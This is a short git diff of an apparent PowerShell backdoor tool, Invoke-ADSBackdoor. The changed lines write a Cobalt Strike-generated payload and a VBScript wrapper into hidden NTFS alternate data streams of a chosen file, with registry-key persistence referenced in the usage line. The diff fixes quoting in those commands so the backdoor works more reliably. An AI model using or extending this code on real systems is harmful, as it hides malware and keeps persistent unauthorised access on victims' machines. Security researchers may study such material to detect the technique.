@@ -40,7 +40,6 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
     }
 
     $payload = $cobaltstrike_gen_payload
-
     $payload_adsfile_name = [System.IO.Path]::GetRandomFileName()
     $wrapper_adsfile_name = [System.IO.Path]::GetRandomFileName()
 
@@ -54,8 +53,8 @@ PS C:\> Invoke-ADSBackdoor -RegKeyName Und3rf10w_key -backdoored_file_path C:\Wi
     $backADSFile = "$backdoored_file_path" + ":$payload_adsfile_name"
     $wrapADSFile = "$backdoored_file_path" + ":$wrapper_adsfile_name"
 
-    $createPayloadADS = {cmd /C "echo $payload > $backADSFile"}
-    $createWrapperADS = {cmd /C "echo $vbtext > $wrapADSFile"}
+    $createPayloadADS = {cmd /C "echo `"$payload`" > `"$backADSFile`""}
+    $createWrapperADS = {cmd /C "echo `"$vbtext`" > `"$wrapADSFile`""}
 
     Invoke-Command -ScriptBlock $createPayloadADS
     Invoke-Command -ScriptBlock $createWrapperADS
